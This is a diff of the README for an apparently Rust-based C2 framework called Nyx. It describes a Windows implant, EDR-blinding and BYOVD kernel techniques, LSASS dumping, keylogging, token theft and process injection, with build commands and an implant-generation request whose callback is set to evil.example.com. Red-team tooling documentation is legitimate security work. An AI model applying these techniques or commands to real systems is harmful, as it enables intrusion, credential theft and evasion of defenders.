@@ -1,23 +1,26 @@
 # Nyx C2 Framework
 
-> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署。**
+> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署或运行。**
 
-纯 Rust 全栈 C2 框架,融合 Cobalt Strike 的可扩展性与 Brute Ratel 的默认隐蔽性。所有能力状态以代码核对为准(审计报告 [`docs/audits/CODE_TRUTH_2026-07-15.md`](docs/audits/CODE_TRUTH_2026-07-15.md))。
+纯 Rust 全栈 C2 框架,融合 Cobalt Strike 的可扩展性与 Brute Ratel 的默认隐蔽性。**所有能力状态以代码核对为准**(本次 README 于 2026-07-18 经 6 路并行代码审计重写,每条声称附 `file:line` 证据)。
 
-**实测规模**:88,874 行 Rust · 26 crate + 1 tool · 674 单元测试 · 55 selftest 导出 · 27 Command / 7 Response 变体。
+> 📋 **完整审计报告**:[`docs/audits/CODE_TRUTH_2026-07-18.md`](docs/audits/CODE_TRUTH_2026-07-18.md)(逐 crate 证据) · [`AUTHORITATIVE_FACTS_2026-07-18.md`](docs/audits/AUTHORITATIVE_FACTS_2026-07-18.md)(数字基准,所有文档统一来源)
+
+**实测规模**:~68,800 行 Rust · 18 workspace 成员 + 6 独立 crate · 488 `#[test]` · 46 个 selftest 导出 · 28 wire `Command` / 7 `Response` 变体。
 
 ---
 
 ## 功能概览
 
-| 层 | 能力 | 代码实情 |
+| 层 | 能力 | 代码实情(2026-07-18 审计) |
 |---|---|---|
-| **加密协议** | X25519 ECDH + HKDF-SHA256 + ChaCha20-Poly1305;方向隔离 nonce;单调计数器防重放;secrets 零化 | ✅ 完整无弱点 |
-| **团队服务器** | tokio/axum HTTP(S);三机制鉴权(bootstrap operator / operators file / legacy token);三角色 RBAC;会话/任务队列;SQLite 凭据+implant 库;哈希链审计;Rhai 事件脚本;Malleable C2 profile;implant 生成 | ✅ 完整 |
-| **Windows PIC 植入体** | 30,848 LOC `no_std` DLL;27 Command;间接 syscall;Fluctuation 睡眠混淆;HWBP patchless blind;CFG 用户态 bitmap;LACUNA/insomniac/caller-spoof/proxy-veh scanner;Pool Party(投递半)+ Module Stomping + ThreadlessInject | ✅ 核心;见已知限制 |
-| **内核层 SDK** | BYOVD(Shield/RTCore64/Iqvw64e 可用,WDTKernel loud-error);ETW-TI blind;DKOM 进程隐藏;回调中和;MiniFilter 解链;PatchGuard 窗口(2 real);PPL stripper;CFG bypass;LSASS dump;minidump 组装 | ✅ 算法完整;见已知限制 |
-| **操作端** | Tauri 2 + React 桌面 GUI(3D 网络拓扑 + 语义化命令 + 结构化输出);REST API;SOCKS5 relay | 🔨 重写中(2026-07-17,替代旧 ratatui TUI + Makepad GUI) |
-| **脚本 / 扩展** | Rhai 脚本(3 event);Malleable C2 profile(c2lint);BOF(CS ABI,W^X loader) | ✅ |
+| **加密协议** | X25519 ECDH + HKDF-SHA256 + ChaCha20-Poly1305;方向隔离 nonce;单调计数器防重放;secrets 零化 | ✅ 完整无弱点(`protocol/src/crypto.rs:383-408`,40 测试) |
+| **团队服务器** | tokio/axum HTTP(S);三机制鉴权(bootstrap operator / operators file / legacy token);三角色 RBAC(argon2id);会话/任务队列;SQLite 凭据+implant 库;哈希链审计;Rhai 事件脚本;Malleable C2 profile;implant 生成 | ✅ 完整(`server/src/lib.rs`,14 静态 + 动态 profile 路由) |
+| **Windows PIC 植入体** | 29,202 LOC `no_std` DLL;**28** Command 全派发;间接 syscall;9 通道(5 直连 + 4 ExtC2 中转);Module Stomping + ThreadlessInject + Pool Party;HWBP patchless blind;CFG 用户态 bitmap;LACUNA/insomniac/caller-spoof/proxy-veh scanner | ✅ 核心链路完整;**睡眠混淆未接线**(见已知限制) |
+| **内核层 SDK** | BYOVD(Shield/RTCore64/Iqvw64e 可用,WDTKernel 物理内存 stub);ETW-TI blind(4-hop);DKOM 进程隐藏;回调中和+重定向;MiniFilter 解链;PPL stripper;CFG bitmap;LSASS 内核读;minidump 组装;ETW 事件伪造 | ✅ 算法完整 + mock 测试;PatchGuard 偏移未验证 |
+| **操作端** | Tauri 2 + React + Three.js 桌面 GUI(3D 网络拓扑 + 语义化命令 + 结构化输出);REST API;2s 轮询增量更新 | ✅ 可用(2026-07-17 接入全部 server 端点);无会话元数据 overlay |
+| **脚本 / 扩展** | Rhai 脚本(3 event,资源配额);Malleable C2 profile(c2lint);BOF(CS ABI,W^X loader,仅 `BeaconPrintf`) | ✅ 脚本可用 / 🟡 BOF 兼容面窄 |
+| **传输层** | 6 个 `Transport` trait impl(Malleable/DoH/Slack/LLM/MCP/SMB)+ JA3/JA4 计算 | 🟡 **零消费者**:仅 JA3/JA4 接入 server,6 个 channel 无 beacon 调用 |
 
 ---
 
@@ -25,67 +28,72 @@
 
 ```
 crates/
-├── protocol/              # 加密协议 (X25519+HKDF+ChaCha20-Poly1305, 2,464 LOC)
-├── server/                # 团队服务器 (tokio/axum, 5,956 LOC)
-├── store/                 # SQLite 凭据库 (842 LOC)
-├── transport/             # TLS JA3/JA4 指纹计算 + 通道定义 (4,018 LOC)
-├── rest/                  # REST 类型库 (client 共享, server 独立)
-├── parse/                 # shell 输出解析器
-├── profile/               # Malleable C2 profile 解析 + c2lint (2,240 LOC)
+├── protocol/              # 加密协议 (X25519+HKDF+ChaCha20-Poly1305, 1,895 LOC, 无 stub)
+├── server/                # 团队服务器 (tokio/axum, 5,615 LOC)
+├── store/                 # SQLite 凭据/implant/session 库 (1,321 LOC)
+├── transport/             # TLS JA3/JA4 + 通道定义 (3,420 LOC, 🟡 零消费者)
+├── rest/                  # REST 类型库 (189 LOC, client 共享)
+├── parse/                 # shell 输出解析器 (544 LOC)
+├── profile/               # Malleable C2 profile 解析 + c2lint (1,733 LOC)
 │
-├── implant-win/           # Windows PIC 植入体 (no_std, 30,848 LOC)
-│   ├── fluctuation.rs     #   睡眠混淆 (PAGE_NOACCESS 翻转 + heap RC4 mask)
-│   ├── blind_hwbp.rs      #   HWBP patchless blind (VEH)
+├── implant-win/           # Windows PIC 植入体 (no_std, 29,202 LOC, 独立 crate)
+│   ├── syscalls.rs        #   间接 syscall runtime (SSN 表 + RX trampoline)
+│   ├── unhook.rs          #   KnownDlls fresh ntdll 映射(反 hook 解析)
+│   ├── blind_hwbp.rs      #   HWBP patchless blind (VEH 影子桩) ← 默认路径
+│   ├── blind.rs           #   AMSI/ETW 字节 patch fallback
 │   ├── cfg_user.rs        #   用户态 CFG bitmap 写入
 │   ├── lacuna.rs          #   .pdata 间隙扫描
-│   ├── inject.rs          #   Module Stomping + ThreadlessInject
-│   ├── tp.rs              #   Pool Party section 投递 (默认 OFF)
-│   ├── stack.rs           #   栈欺骗 SPOOF_SWAP (CET-off 自动 arm)
-│   ├── sleep.rs           #   Foliage APC [死代码, 保留参考]
-│   └── selftests.rs       #   48 个 selftest (全 crate 共 55)
-├── operator-kernelsdk/    # 内核 EDR 绕过 SDK (9,789 LOC)
-│   ├── byovd.rs           #   KernelRw trait + 驱动
-│   ├── byovd_drivers/     #   Shield / RTCore64 / Iqvw64e / WDTKernel
+│   ├── stack.rs           #   BYOUD-Gap 栈欺骗 (mov rsp 内联汇编)
+│   ├── fluctuation.rs     #   睡眠混淆实现 (🟡 未接线,见已知限制)
+│   ├── sleep.rs           #   Foliage APC 脚手架 (🔴 死代码)
+│   ├── inject.rs          #   Module Stomping (默认 arm) + ThreadlessInject
+│   ├── tp.rs              #   Pool Party (默认 OFF)
+│   ├── channels/          #   9 通道: Https/DohDns/Dns/Smb/Tcp + 4 ExtC2 中转
+│   └── selftests.rs       #   46 个 selftest 导出 (feature-gated)
+├── operator-kernelsdk/    # 内核 EDR 绕过 SDK (9,791 LOC, 独立 crate)
+│   ├── byovd.rs + byovd_drivers/  # BYOVD: Shield / RTCore64 / Iqvw64e / WdtKernel(stub)
 │   ├── etwti.rs           #   ETW-TI blind (4-hop)
-│   ├── etw_deception.rs   #   事件伪造 [死代码, 无 CLI 调用方]
-│   ├── telemetry.rs       #   MiniFilter 解链 + 回调中和
-│   ├── persistence.rs     #   DKOM 隐藏 + PPL + PatchGuard 窗口
+│   ├── telemetry.rs       #   回调中和 + MiniFilter 解链
+│   ├── persistence.rs     #   DKOM 隐藏 + PPL strip + PatchGuard 窗口
+│   ├── netsec.rs          #   LSASS 内核读 + CFG bitmap + WfpKit(🟡 永返 Err)
+│   ├── etw_deception.rs   #   ETW 事件伪造 (🟡 仅 CLI 调用,无 tier 装配)
 │   └── win/ksld.rs        #   LivingOffDefender (优先于 BYOVD)
 │
-├── operator-kernel-cli/   # 内核 CLI (9 子命令 + daemon)
-├── offset-resolver/       # ntoskrnl PDB 下载 + 偏移解析
-├── minidump-assembler/    # LSASS 裸内存 → mimikatz .dmp
+├── operator-kernel-cli/   # 内核 CLI (912 LOC, 5 binary, 含 daemon 模式)
+├── offset-resolver/       # ntoskrnl/fltmgr PDB 下载 + 偏移解析 (657 LOC)
+├── minidump-assembler/    # LSASS 裸内存 → mimikatz .dmp (469 LOC)
 │
-├── client-ui-web/         # 操作端 GUI (Tauri 2 + React + Three.js,3D 拓扑 + 语义化命令)
-│
-├── agent-dev/             # macOS/Linux 开发验证植入体 (完整协议循环)
-├── bof-runner/            # BOF 加载器 (CS ABI)
-├── coff/                  # COFF/AMD64 解析 + 重定位
-├── evasion/               # syscall 解析 (Hell/Halo/Tartarus Gate)
-├── implant-evasionsdk/    # 植入体逃避 SDK trait (5/9 有 live impl)
-├── scripting/             # 脚本事件总线
-├── scripting-rhai/        # Rhai 引擎绑定
-├── config/                # 编译期加密配置 (ChaCha20-Poly1305)
-├── config-macros/         # embed! proc-macro
-├── nyx-loader/            # PIC payload 加密 [反射加载未实现]
-├── nyx-mutate/            # 二进制变异 (NOP/寄存器轮转/密钥随机化)
-└── pe/                    # [死 crate, 零依赖]
+├── client-ui-web/         # 操作端 GUI (Tauri 2 + React + Three.js)
+│   ├── src-tauri/src/     #   Rust 后端 (~613 LOC, 12 #[tauri::command])
+│   └── src/               #   前端 (~4,500 LOC ts/tsx, 含 1001 LOC 拓扑场景)
+├── agent-dev/             # macOS/Linux 开发验证植入体 (1,181 LOC, 完整协议循环)
+├── bof-runner/            # BOF 加载器 (421 LOC, 仅 BeaconPrintf shim)
+├── coff/                  # COFF/AMD64 解析 + 重定位 (365 LOC)
+├── evasion/               # syscall 解析 (Hell/Halo/Tartarus Gate, 264 LOC)
+├── implant-evasionsdk/    # 植入体逃避算法库 (2,028 LOC, 9 trait 全 floor)
+├── scripting/             # 脚本事件总线 (237 LOC)
+├── scripting-rhai/        # Rhai 引擎绑定 (166 LOC, 资源配额)
+├── config/ + config-macros/  # 编译期加密配置 (ChaCha20-Poly1305, 345 LOC)
+├── nyx-loader/            # PIC payload 加密 (1,225 LOC;🔴 反射加载仅参考实现)
+└── nyx-mutate/            # 二进制变异 (804 LOC, 4 趟含指令替换)
 ```
+
+> **注**:`implant-win` / `operator-kernelsdk` / `operator-kernel-cli` / `minidump-assembler` / `offset-resolver` / `implant-evasionsdk` 共 6 个 crate 是**独立 crate**(不在 workspace,因 no_std/nightly/Windows target 隔离),单独构建。
 
 ### 工作量统计(实测)
 
-| 维度 | 数值 |
-|---|---|
-| 总 Rust 源码 | 88,874 行 |
-| crate 数 | 26 + 1 tool(pe 死) |
-| `#[test]` 函数 | 674 |
-| selftest 导出 | 55 |
-| wire Command 变体 | 27 |
-| wire Response 变体 | 7 |
-| TUI 命令 | 64(~58 独立顶层) |
-| server API 端点 | 14 operator + 6 kernel(条件注册) |
-| BYOVD 驱动 | 3 可用 + 1 loud-error |
-| Windows build 覆盖 | 10240 · 14393 · 17763 · 19041 · 20348 · 22621 · 26100 |
+| 维度 | 数值 | 来源 |
+|---|---|---|
+| workspace Rust 源码 | 68,751 行 | `find crates -name '*.rs' \| xargs wc -l` |
+| workspace 成员 | 18(+6 独立) | `Cargo.toml [workspace] members` |
+| `#[test]` / `#[tokio::test]` | 488 | 含独立 crate;`cargo test --workspace` 跑 267(workspace 内) |
+| selftest 导出 | 46 | `implant-win/src/selftests.rs`(`#[cfg(feature="selftest")]`) |
+| wire `Command` 变体 | **28** | `protocol/src/msg.rs:130` |
+| wire `Response` 变体 | 7 | `protocol/src/msg.rs:560` |
+| GUI 命令(已解析) | 29 | `client-ui-web/src/components/CommandInput.tsx` |
+| server 路由 | 14 静态 + 7 beacon + 6 kernel(条件) + 动态 profile | `server/src/lib.rs:716-779` |
+| BYOVD 驱动 | 3 可用 + 1 stub | `operator-kernelsdk/src/byovd_drivers/` |
+| Windows build 覆盖 | 8 主 + 6 patch-equiv = 14 distinct | `implant-evasionsdk/src/offsets_table.rs` |
 
 ---
 
@@ -93,10 +101,11 @@ crates/
 
 | 工具 | 版本 | 用途 |
 |---|---|---|
-| Rust stable | ≥ 1.80 | 服务端 / 客户端 / 支撑 crate |
+| Rust stable | ≥ 1.80 | 服务端 / 客户端 / 支撑 crate(workspace 默认) |
 | Rust nightly | — | 植入体(`implant-win`,`no_std`) |
 | `x86_64-pc-windows-gnu` target | — | 植入体交叉编译 |
 | `mingw-w64` | 16.1.0 推荐 | Windows 交叉链接器 |
+| Node.js | ≥ 18 | GUI 前端构建 |
 | Windows Server 2019+ | — | 植入体真机运行 |
 
 ```bash
@@ -135,53 +144,51 @@ export NYX_SERVER_PUB=<服务器输出的公钥 hex>
 cargo run --release -p nyx-agent-dev
 ```
 
+`agent-dev` 跑完整加密协议循环(check-in / task / execute / return),Windows-only 原语(StealToken/Inject/Trex/Keylog 等)返回 `Response::Err`。
+
 ### 3. 构建 Windows PIC 植入体
 
+> ⚠️ **implant-win 是独立 crate,不在 workspace 里。** 必须在它的目录内构建,不能用 `-p nyx-implant-win`。
+
 ```bash
-# 检查编译
-cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
+# 检查编译(从仓库根目录)
+(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)
 
 # Release 构建
-cargo +nightly build --release -p nyx-implant-win \
-  --target x86_64-pc-windows-gnu \
-  -Z build-std=core,alloc
+(cd crates/implant-win && cargo +nightly build --release \
+  --target x86_64-pc-windows-gnu -Z build-std=core,alloc)
 ```
 
 输出 `target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll`。
 
 > **编译期 gate**(均为 `option_env!`,默认值见下表):
-> - `NYX_FLUCTUATION_OFF=1` — 关闭 Fluctuation 睡眠混淆(退到纯 sleep)
-> - `NYX_SPOOF_OFF=1` — 关闭栈欺骗(CET-off 主机默认自动 arm)
-> - `NYX_FOLIAGE_OFF=1` — 无运行时效果(Foliage APC 是死代码)
-> - `NYX_TLS_INSECURE=1` — 放宽 WinHTTP 证书校验(默认 OFF,有已知 bug 见下)
-> - `NYX_POOL_PARTY_ON=1` — 开启 Pool Party 注入(默认 OFF,仅投递半)
-> - `NYX_SKIP_SANDBOX=1` — 跳过沙箱检测(SYSTEM 部署时)
+> - `NYX_FLUCTUATION_OFF=1` — 关闭 Fluctuation 睡眠混淆(退到纯 sleep)。**注:当前 beacon 循环本就不经 Fluctuation**(`kits.rs:65-71` 短路到 `beacon::sleep_seconds`),此 gate 暂无运行时效果。
+> - `NYX_SPOOF_OFF=1` — 关闭栈欺骗(CET-off 主机默认自动 arm,`entry.rs:137-153`)
+> - `NYX_TLS_INSECURE=1` — 放宽 WinHTTP 证书校验(默认 OFF)。`WinHttpSetOption` 在 `WinHttpSendRequest` **之前**调用(`transport.rs:332-353`)。
+> - `NYX_POOL_PARTY_ON=1` — 开启 Pool Party 注入(默认 OFF)
+> - `NYX_SKIP_SANDBOX=1` — 跳过沙箱检测(SYSTEM 部署时;**注意此项是运行时 env,非编译期**)
 
 ### 4. 启动操作端 GUI (Tauri 2 + React)
 
 ```bash
 cd crates/client-ui-web
-npm install          # 首次：装前端依赖
-npm run tauri dev    # 启动（自动连 http://127.0.0.1:8443，在连接页输入 bearer）
+npm install          # 首次:装前端依赖
+npm run tauri dev    # 启动(自动连 http://127.0.0.1:8443,在连接页输入 bearer)
 ```
 
-> GUI 含 3D 网络拓扑（Three.js，节点带官方 OS 图标）、语义化命令输入、结构化任务输出。
-> 纯前端开发（不启动 Tauri 外壳）：`npm run dev`。
+> GUI 含 3D 网络拓扑(Three.js,UnrealBloom 后处理 + 射线点击选中)、语义化命令输入、结构化任务输出、2s 增量轮询。纯前端开发(不启 Tauri 外壳):`npm run dev`。
 
-### 6. 服务器侧生成 implant
+### 5. 服务器侧生成 implant
 
 ```bash
-# TUI 内
-/generate <callback_host> [port] [flags]
-
-# 或 API
+# REST API
 curl -X POST http://127.0.0.1:8443/api/generate-implant \
   -H "Authorization: Bearer admin:your_secret" \
   -H "Content-Type: application/json" \
   -d '{"callback":"evil.example.com","port":443,"format":"dll"}'
 ```
 
-服务器 patch DLL 模板(每 implant 独立 X25519 keypair + config 加密 + mutation + 一次性 auth_token),`NYX_TEMPLATE` 指向模板路径。
+服务器 patch DLL 模板(每 implant 独立 X25519 keypair + config 加密 + mutation + 一次性 auth_token),`NYX_TEMPLATE` 指向模板路径。速率限制 10/hr/target(`implant_gen.rs`)。
 
 ---
 
@@ -190,198 +197,123 @@ curl -X POST http://127.0.0.1:8443/api/generate-implant \
 | 变量 | 默认 | 说明 |
 |---|---|---|
 | `NYX_BIND` | `127.0.0.1:8443` | 监听地址 |
-| `NYX_KEYFILE` | —(每次随机) | 持久 X25519 私钥(0600)。session 元数据经 SQLite 持久化层落盘(`NYX_CREDS` 库,boot 恢复,见 `server/src/lib.rs:201`) |
+| `NYX_KEYFILE` | —(每次随机) | 持久 X25519 私钥(0600)。session 元数据经 SQLite 持久化层落盘(`NYX_CREDS` 库,boot 恢复,`server/src/lib.rs:250-336`) |
 | `NYX_TOKEN` | — | legacy 共享 Bearer(Admin);优先级低于 operators file |
-| `NYX_BOOTSTRAP_OPERATOR` | — | `name:secret` 首个 Admin(argon2 哈希) |
+| `NYX_BOOTSTRAP_OPERATOR` | — | `name:secret` 首个 Admin(argon2id 哈希,`operators.rs:127-158`) |
 | `NYX_OPERATORS_FILE` | `~/.nyx/operators.json` | 操作员注册表 |
-| `NYX_KILLDATE` | —(永不过期) | Unix 时间戳,过期拒绝所有 beacon |
+| `NYX_KILLDATE` | —(永不过期) | Unix 时间戳,过期拒绝所有 beacon(`main.rs:47-59`) |
 | `NYX_TLS` | off | 任意值启用 rustls HTTPS |
 | `NYX_CERT` / `NYX_KEY` | — | PEM 证书/密钥(需同时设) |
 | `NYX_PROFILE` | — | Malleable C2 profile(c2lint 在加载时验证) |
-| `NYX_SCRIPT` | — | Rhai 事件脚本(SessionNew/ResultReceived/SessionExit) |
-| `NYX_CREDS` | `~/.nyx/server-creds.db` | 凭据+implant SQLite 路径 |
-| `NYX_AUDIT_LOG` | `~/.nyx/audit.jsonl` | 审计日志(哈希链) |
+| `NYX_SCRIPT` | — | Rhai 事件脚本(`on_session_new` / `on_result` / `on_session_exit`) |
+| `NYX_CREDS` | `~/.nyx/server-creds.db` | 凭据+implant+session SQLite 路径 |
+| `NYX_AUDIT_LOG` | `~/.nyx/audit.jsonl` | 审计日志(哈希链,`audit.rs:106-261`) |
 | `NYX_TEMPLATE` | — | implant DLL 模板路径(启用生成) |
 | `NYX_KERNEL_DAEMON` | — | `host:port` 内核 daemon;设后注册 `/api/kernel/*` 路由 |
 | `NYX_ALLOW_OPEN` | — | `=1` 允许非 loopback 开放模式 |
 | `NYX_SESSION_MAX_AGE` | `604800`(7d) | session 年龄 GC |
 | `NYX_SESSION_MAX_IDLE` | `86400`(24h) | session 空闲 GC |
-| `NYX_WORKDIR` | — | 服务器工作目录 |
 
 ---
 
-## TUI 命令速查
+## GUI 命令速查
 
-64 个 `MetaCmd` 条目(~58 独立顶层),零 stub。全部映射到真实 REST 调用或本地 overlay。
+操作端为 Tauri 桌面 GUI(旧 ratatui TUI / Makepad GUI 已于 commit `c5064dc` 归档)。命令输入框解析 **29 个命令**(`CommandInput.tsx:214-454`),全部映射到 `POST /api/task`。session 元数据(rename/tag/star/alias)**尚未接入 GUI**。
 
-### 会话管理
+### 会话 / 侦察
 
 ```
-/sessions [filter]      列出活跃会话(支持 tag/star/alias 过滤)
-/use <id>               选择当前操作会话
-/info                   当前会话详情
-/tasks                  任务队列
-/rename /tag /untag     会话元数据
-/star /note             收藏 / 备注
-/alias add|rm|list      会话别名
-/topo                   会话拓扑图
+ping                    存活探测
+sleep <s> [jitter]      调整睡眠
+screenshot              屏幕截图(BMP,跨会话)
+screenwatch             持续截屏(3 帧)
+driveinfo               驱动器信息
+env [NAME]              环境变量
+clipboard               剪贴板
+net                     ifconfig/netstat/arp
+portscan <host> <ports> TCP 端口扫描
 ```
 
 ### 文件操作
 
 ```
-/ls [path]              目录列表
-/cd /mkdir /rm          文件系统操作
-/mv /cp                 移动 / 复制
-/upload <local> <remote>  上传
-/download <remote> [local]  下载(分块)
+ls [path]               目录列表
+cd / mkdir / rm         文件系统操作
+mv / cp                 移动 / 复制
+upload <local> <remote>   上传
+download <remote>       下载(64KB 分块)
 ```
 
-### 执行
+### 执行 / 权限
 
 ```
-<shell cmd>             通过 cmd.exe 执行(无 / 前缀)
-/bof <file.o> [args]    加载执行 BOF(CS ABI)
-/inject <method> <target> <file>  进程注入(0=PoolParty 1=ThreadlessHWBP 2=ModuleStomp)
+shell <cmd>             cmd.exe /c 或 sh -c
+bof <hex> [args...]     BOF 执行(仅 BeaconPrintf 兼容)
+exit                    退出 implant
+getuid                  当前用户
+stealtoken <pid>        窃取 token(Windows)
+maketoken <u> <d> <p>   制作 token
+rev2self                还原 token
 ```
 
-### 侦察
+### 凭据 / 控制 / 隧道
 
 ```
-/ps                     进程列表
-/ping                   存活检测
-/portscan <host> <ports>  端口扫描
-/net <ifconfig|arp|routes|conn>  网络信息
-/drive                  磁盘信息
-/clipboard              剪贴板
-/env [name]             环境变量
-/screenshot [mon]       截屏(跨会话, Task Scheduler)
-/screenwatch <secs>     持续截屏
-/trex                   T-REX 威胁分级扫描
-```
-
-### 权限 / 令牌
-
-```
-/getuid                 当前身份
-/steal <pid>            窃取进程令牌
-/make_token <d\u> <pass> [1|2|3]  创建模拟令牌
-/rev2self               还原令牌
-```
-
-### 凭据 / 哈希
-
-```
-/hashdump [sam|system|lsass|shadow]  转储(lsass 在 implant 侧 deferred)
-/keylog start|stop|dump  键盘记录
-/keylog stream [secs]    持续键盘记录
-/keylog unstream         停止持续记录
-```
-
-### 控制
-
-```
-/sleep <secs> [jitter%]  beacon 间隔
-/channel <0-8|name>      切换 C2 通道
-/kill                    终止植入体(需确认)
-```
-
-### 网络隧道
-
-```
-/pivot <host> <port>     建立 SOCKS5 通道
-/socks start [addr]      SOCKS5 relay(loopback)
-/socks stop              停止
-/socks <chan> <op> <addr> <port>  手动通道控制
-/chan close <id>         关闭通道
-```
-
-### 内核层(TUI 内, 需 `NYX_KERNEL_DAEMON`)
-
-```
-/driver-status           BYOVD/KslD 状态
-/blind-etw               ETW-TI 盲化
-/hide <pid>              DKOM 进程隐藏(需确认)
-/dump-lsass <pid>        LSASS minidump(需确认)
-/neutralize <pid> <freeze|choke|kill>  EDR 中和(需确认)
-/detach-mf               MiniFilter 解链
-```
-
-### 凭据管理 / 审计 / 生成
-
-```
-/creds [list]            凭据列表(本地 overlay)
-/creds find <query>      搜索
-/creds sync [reveal]     从服务器同步
-/creds add <realm> <user> <kind> <secret>  添加
-/creds del <realm> <user> <kind>           删除
-/creds export json|csv   导出
-/audit [operator|action|limit]  审计日志
-/audit verify            验证哈希链
-/generate <cb> [port] [flags]  生成 implant
-/implants                已生成 implant 列表
-/revoke <pub>            撤销 implant
-```
-
-### 客户端
-
-```
-/connect <url> [token]   连接服务器
-/profile                 当前 Malleable C2 profile
-/theme <name>            主题(mocha/frappe/macchiato/hc/nocolor)
-/config [stream_cap N]   客户端配置
-/help /clear
+hashdump [method]       SAM/SYSTEM hash 提取(method=3 macOS shadow-hash)
+keylog <start|dump>     键盘记录(Windows)
+inject <pid> <hex> [m]  进程注入(m: 0=PoolParty/OFF→stomp, 1=ThreadlessHWBP, 2=stomp)
+connect <host> <port>   TCP 反向端口转发
+socks <port>            SOCKS5 relay
+setchannel <ch>         切换 C2 通道
+channelclose <id>       关闭通道
+trex                    T-REX EDR 评估分级
 ```
 
 ---
 
 ## 内核层操作
 
-> 需要 BYOVD 驱动或 KslD(LivingOffDefender,优先)+ SYSTEM 权限
+内核能力通过独立 CLI 操作(需 Windows + 管理员),或通过 team server 的 `/api/kernel/*` 中转(需先启 daemon):
 
 ```bash
-# 内核 CLI
-cargo run -p nyx-operator-kernel-cli -- \
-  --driver \\.\RTCore64 --pid <target_pid> bootstrap
+# 内核 CLI(独立 crate)
+(cd crates/operator-kernel-cli && cargo run --release --)
 
 # 子命令: bootstrap / blind-etw / hide <pid> / dump-lsass <pid> \
 #         neutralize <pid> <freeze|choke|kill> / detach-minifilter \
-#         pg-window / cfg-bypass / --serve <port>(daemon 模式)
+#         pg-window / cfg-bypass / forge-etw / --serve <port>(daemon 模式)
 ```
+
+`--serve <port>` 启动 TCP JSON-line daemon,team server 设 `NYX_KERNEL_DAEMON=127.0.0.1:<port>` 后会注册 `/api/kernel/{status,blind-etw,hide,dump-lsass,neutralize,detach-minifilter}` 6 个路由。
 
 ### 偏移自动解析
 
 ```bash
 # 从 MS Symbol Server 下载 ntoskrnl.pdb 解析偏移
-cargo run -p nyx-offset-resolver -- --ntoskrnl --guid <guid> --age <age>
+(cd crates/offset-resolver && cargo run --release -- \
+    --ntoskrnl C:\Windows\System32\ntoskrnl.exe --out offsets.toml)
 
 # 或从 fltmgr.pdb 解析 FltGlobals RVA
-cargo run -p nyx-offset-resolver -- --fltmgr --guid <guid> --age <age>
+(cd crates/offset-resolver && cargo run --release -- \
+    --fltmgr C:\Windows\System32\drivers\fltmgr.sys --out flt.toml)
 ```
 
-内置 EPROCESS 偏移表(14 build,patch-equivalent 展开):
-
-| Windows Build | PID | Links | Protection |
-|---|---|---|---|
-| 17763(Server 2019 / Win10 1809) | `0x2e0` | `0x2e8` | `0x6ca` |
-| 18362–19045(Win10 1903–22H2) | `0x2e8` | `0x2f0` | `0x6fa` |
-| 20348 / 22000(Server 2022 / Win11 21H2) | `0x440` | `0x448` | `0x87a` |
-| 22621 / 22631(Win11 22H2/23H2) | `0x440` | `0x448` | `0x87a` |
-| 26100 / 26200(Win11 24H2/25H2) | `0x450` | `0x458` | `0x87e` |
+无 PDB 时回退到内置偏移表(`implant-evasionsdk/src/offsets_table.rs`,覆盖 8 主 build + 6 patch-equivalent)。
 
 ---
 
 ## 线网协议
 
 ```
-[32B 会话公钥][8B 计数器 LE][4B 密文长度 LE][密文 || 16B Poly1305 tag]
+[4B frame magic "NYX1"][1B dir][8BE u64 counter][4BE u32 ct_len][12B nonce][N ct][16B Poly1305 tag]
 ```
 
-- 会话密钥 = `HKDF-SHA256(ECDH(implant_eph, server_id))`,绑定两端公钥,salt=server_pub,info=`"nyx-session-v1"‖server_pub‖implant_pub`
-- AEAD = ChaCha20-Poly1305;96-bit nonce = 方向判别字节(0x00 C2S / 0x01 S2C)+ 计数器;公钥作 AAD
-- 防重放:单调计数器,写锁保护,winner-takes-all 插入
-- secrets(SessionKey/Keypair)impl Drop 零化;全零 scalar 拒绝
-- 批量编解码有 allocation-bomb 守卫(MAX_BATCH=65536, MAX_WIRE_COUNT=256)
+- **方向隔离 nonce**:dir 字节(0=client→server, 1=server→client)分离两套计数器空间(`crypto.rs:383-408`)
+- **防重放**:单调计数器 + 写守卫 TOCTOU 关闭(`server/src/lib.rs`)
+- **分配炸弹防护**:`decode_vec` 拒绝 declared count > 65536,且不超过剩余字节(`msg.rs:35-41`)
+- **blob 长度上限**:`MAX_BLOB_LEN` = 256 KiB;frame `MAX_CT_LEN` = 512 KiB
+
+完整 28 Command + 7 Response 的 wire 编解码见 `protocol/src/msg.rs`,round-trip 测试在 `protocol/tests/roundtrip.rs`。
 
 ---
 
@@ -391,52 +323,56 @@ cargo run -p nyx-offset-resolver -- --fltmgr --guid <guid> --age <age>
 # 工作区构建(服务端 + 客户端 + 支撑 crate)
 cargo build --workspace
 
-# 全量测试
-cargo test --workspace          # 674 个 #[test]
+# 工作区测试(约 267 个)
+cargo test --workspace
 
-# 植入体检查(nightly + Windows target)
-cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
+# 植入体检查(nightly + Windows target,需 cd 进独立 crate)
+(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)
 
-# 内核 SDK 测试(独立 crate)
-cargo test -p nyx-operator-kernelsdk    # 112 个 #[test]
+# 内核 SDK 测试(独立 crate,全 mock,可 macOS 跑)
+(cd crates/operator-kernelsdk && cargo test)
 
 # 独立 crate 测试
-cargo test -p nyx-implant-evasionsdk     # 53 个 #[test]
-cargo test -p nyx-transport              # 75 个 #[test]
+for c in implant-evasionsdk evasion coff config config-macros minidump-assembler nyx-loader nyx-mutate bof-runner; do
+  (cd crates/$c && cargo test)
+done
 
 # Malleable C2 profile 验证
-cargo run -p nyx-profile --bin c2lint -- <profile.c2>
+cargo run -p nyx-profile --bin c2lint -- <profile>
 
 # lint
-cargo clippy --workspace -- -D warnings
+cargo clippy --workspace --all-targets
 ```
 
 ---
 
-## 已知限制(代码核对实情)
+## 已知限制(代码核对实情,2026-07-18)
 
-| 项 | 代码实情 | 证据 |
+| 项 | 代码实情 | 证据(file:line) |
 |---|---|---|
-| **Foliage APC .text 加密** | 🔴死代码 | `sleep.rs` 四函数 `#[allow(dead_code)]` + FATAL 注释;beacon 走 `kits::sleep`→Fluctuation,不调 `sleep::sleep()`。`NYX_FOLIAGE_OFF` 无运行时效果 |
